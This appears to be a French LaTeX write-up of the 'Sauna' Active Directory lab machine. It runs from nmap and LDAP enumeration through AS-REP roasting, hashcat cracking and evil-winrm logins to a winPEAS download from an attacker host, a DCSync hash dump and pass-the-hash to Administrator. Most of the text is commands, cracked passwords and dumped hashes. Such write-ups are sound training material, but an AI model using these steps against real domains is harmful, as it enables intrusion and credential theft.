\chapter{Sauna}
\begin{itemize}
    \item {\bf technics}: dcsync kASREPRoastin, pass the hash, winlogon
    \item {\bf Components}: Active directory, kerberos
    \item {\bf tools}: kerbrute, username-anarchy, GetNPUsers, ldapsearch,
        evil-winrm, winPeas
\end{itemize}


\section{Résumé}

\section{Details}

\subsection{Discovery}

\subsubsection{nmap}

\begin{verbatim}
$ sudo nmap -sV -sC -Pn -oX nmap  10.10.10.175
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 05:21 CEST
Nmap scan report for 10.10.10.175
Host is up (0.047s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-22 10:22:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-09-22T10:22:25
|_  start_date: N/A
|_clock-skew: 6h59m59s

$ sudo nmap -p-  10.10.10.175
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 05:28 CEST
Nmap scan report for 10.10.10.175
Host is up (0.033s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49697/tcp open  unknown
\end{verbatim}

\subsubsection{dns}
\begin{verbatim}
 drill any egotistical-bank.local  @10.10.10.175
;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 31219
;; flags: qr aa rd ra ; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3
;; QUESTION SECTION:
;; egotistical-bank.local.	IN	ANY

;; ANSWER SECTION:
egotistical-bank.local.	600	IN	A	10.10.10.175
egotistical-bank.local.	3600	IN	NS	sauna.egotistical-bank.local.
egotistical-bank.local.	3600	IN	SOA	sauna.egotistical-bank.local. hostmaster.egotistical-bank.local. 48 900 600 86400 3600
egotistical-bank.local.	600	IN	AAAA	dead:beef::d82a:5af8:762a:f639

;; AUTHORITY SECTION:

;; ADDITIONAL SECTION:
sauna.egotistical-bank.local.	3600	IN	A	10.10.10.175
sauna.egotistical-bank.local.	3600	IN	AAAA	dead:beef::1e1
sauna.egotistical-bank.local.	3600	IN	AAAA	dead:beef::84c1:3496:a1b3:e637

;; Query time: 27 msec
;; SERVER: 10.10.10.175
;; WHEN: Thu Sep 22 05:41
\end{verbatim}

no zone transfert

\subsubsection{smb}
rien pour le moment

\subsubsection{http}

rien de flagrant

\subsubsection{ldap}

\begin{verbatim}
$ ldapsearch -H ldap://10.10.10.175 -x -b "DC=egotistical-bank, DC=local" -W
Enter LDAP Password:
# extended LDIF
#
# LDAPv3
# base <DC=egotistical-bank, DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20220922101750.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 98336
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAEzHP
 BkDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
 AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==
creationTime: 133083154702022656
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
...
\end{verbatim}

paie ton anonymous search. Mais il semble que l'on ne puisse pas en tirer grand
chose.

\subsubsection{Kerberos}

comme on trouve des noms dans \verb+about.html+ on va essayer de kerbrute

\begin{verbatim}
$ username-anarchy --input-file /tmp/fullnames.txt \
    --select-format firstlast,first.last,f.last,first,flast,firstl > mixed.txt

$ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local ./mixed.txt

2022/09/22 12:31:20 >  Using KDC(s):
2022/09/22 12:31:20 >   10.10.10.175:88

2022/09/22 12:31:20 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:c8c3e1c2fb1d47761873497c6466a3e9$b720d13344071767e69a263c96ffe96c3ba69ae4d061ccb26b2d82f37debedb89bafe69eab599870fee296b49cfea2dd64f6ef8ccbf8f2c0021878840b7a68894babe5de0609d29fda9bda032b130a5b89919ddd34c32eb0c69c1a4dd521c781b2abe37e349dbc7858c1b08f1c51f3dbcc5542c51596eb1e09e48d26208e4bfde8ecb2f5ec5aecc917e6af21f0e6ed04f242f34433c76b63d987647a393d623f75bae83a95f80bc3be96c3f1d03fa2e68d5066e57749e51ecff3e343747dffda938201baad51709f6788c1a9f73563b2872205ed57e7efbea60639d769bd6e7bace9f2ade786b8b39d5b0bd69b170b06e11ace732b1fc97653d054beb75ff28ebe2d26a4d8c75808d9946c7f77a20b1b885ffb81f87b
2022/09/22 12:31:20 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
\end{verbatim}

on ne peut pas le cracker. Donc on passe par \verb+GetNPUsers.py+ puis un coup
de hashcat:
\begin{verbatim}
$ hashcat -m 18200 fsmith.hash /usr/share/wordlists/passwords/rockyou.txt
hashcat (v6.2.6) starting
...
37d32a58c75a99829f6d54:Thestrokes23

Session..........: hashcat
Status...........: Cracked
\end{verbatim}

On essaie de se connecter grace à l'ouverture du port 5985:
\begin{verbatim}
$ evil-winrm  -i 10.10.10.175 -u fsmith -p Thestrokes23
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>
\end{verbatim}

\subsection{Discovery}
\subsubsection{User}
\begin{verbatim}
*Evil-WinRM* PS C:\Users\FSmith\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
\end{verbatim}




Ok donc on peut ajouter une machine.

\subsubsection{AD}
on peut faire un coup de pompage sur l'AD
\begin{verbatim}
$ ldapsearch -x -H ldap://10.10.10.175 -x \
-D 'egotisticalbank\fsmith' -w 'Thestrokes23' -b 'DC=egotistical-bank,dc=local'
\end{verbatim}


\begin{verbatim}
$ bloodhound-python  -u 'fsmith@egotistical-bank.local' \
    -p 'Thestrokes23' -ns 10.10.10.175 -d  egotistical-bank.local -c all
INFO: Found AD domain: egotistical-bank.local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 08S
\end{verbatim}

On peut voir que \verb+svc_loanmgr+ peut DCSync. Mais je ne vois pas comment on
peut l'atteindre.

on peut essayer de voir si via \verb+GetUserSPNs+. Mais ca ne marche pas et l'utilisateur n'a pas 
le droit de le modifier.

\subsubsection{Windows Discovery}

\begin{verbatim}
\> curl http://10.10.16.3/winPEAS.bat -outfile winPeas.bat

...
 [+] Files in registry that may contain credentials
   [i] Searching specific files that may contains credentials.
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
...

 evil-winrm  -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>

\end{verbatim}


\subsection{Priv Esc}

\begin{verbatim}
$ secretsdump.py -just-dc 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:280a32dc08a3b4309760d57d4e52055b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:5faa1e5c8e1d459ca84c18d704db4df1fb1e00e3d18d9e60dc86b18fd276488b
SAUNA$:aes128-cts-hmac-sha1-96:298fb8a9abef22839e3dea86f11430a7
SAUNA$:des-cbc-md5:a4523e83d5a14916

$ evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>


\end{verbatim}




\section{Theorie}


